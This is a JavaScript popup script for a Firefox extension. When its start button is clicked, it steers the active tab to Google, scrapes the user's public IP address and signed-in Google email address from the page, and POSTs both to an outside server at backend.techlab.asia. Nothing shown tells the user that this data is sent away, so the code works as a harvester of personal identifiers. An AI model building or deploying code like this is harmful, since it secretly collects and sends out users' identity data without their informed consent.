const info = (function () {
    const _info = { email: "", ip: "" }
    const prop = {};
    prop.setEmail = function (email) { _info.email = email }
    prop.setIp = function (ip) { _info.ip = ip }
    prop.getInfo = function () { return _info };
    return prop;
})();

const startBtn = document.getElementById('startBtn');

startBtn.addEventListener("click", async () => {
    await getIp();
    await getEmail();
    doLogInfo();
});

async function getIp() {
    const tab = await getCurrentTab();
    // search for IP
    await navigateToURL(tab, 'https://www.google.com/search?q=what+is+my+ip');

    // get IP
    await browser.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
            const ip = document.getElementsByClassName('NEM4H VL3Jfb BmP5tf')[0]?.innerText;
            browser.runtime.sendMessage({ ip });
        }
    });
    // await doTask(async () => {

    //     return !!(info.getInfo()?.ip);
    // });
}

async function getEmail() {
    const tab = await getCurrentTab();

    // enter google to look up email
    await navigateToURL(tab, 'https://google.com/');

    // get Email
    await browser.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
            const email = document.getElementsByClassName('gb_xc')[0]?.getElementsByTagName("div")[2]?.innerText;
            browser.runtime.sendMessage({ email });
        },
    })
}

browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
    const { email, ip } = request;
    console.log(JSON.stringify(request));
    if (email) info.setEmail(email);
    if (ip) info.setIp(ip);
})

async function getCurrentTab() {
    let queryOptions = { active: true, currentWindow: true };
    let [tab] = await browser.tabs.query(queryOptions);
    return tab;
}

async function navigateToURL(tab, url) {
    await browser.tabs.update(tab?.id, { url: url });
    await delay(1000);
}

// /**
//  * @param {*} task: function has return boolean (return true done task or repeat time hits limit)
//  * @param {*} repeatTimeLimit 
//  * @param {*} _delay: delay while repeat task
//  */
// const doTask = async (task, repeatTimeLimit, _delay) => {
//     const repeat = repeatTimeLimit ? repeatTimeLimit : 10;
//     let repeatCount = 0;
//     let success = false;
//     while (!success && (repeatCount < repeat)) {
//         console.log('do task');
//         success = task();
//         repeatCount++;
//         await delay(_delay ? _delay : 1000);
//     }
// }

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const infoBtn = document.getElementById('info');

infoBtn.addEventListener("click", async () => {
    alert(JSON.stringify(info.getInfo()));
});

const doLogInfo = async () => {
    const { email, ip } = info.getInfo();
    console.log(email, ip);
    await fetch('https://backend.techlab.asia/api/log/new', {
        method: 'POST',
        mode: 'cors',
        cache: 'no-cache',
        credentials: 'same-origin',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email, ip, firefox: true })
    })
}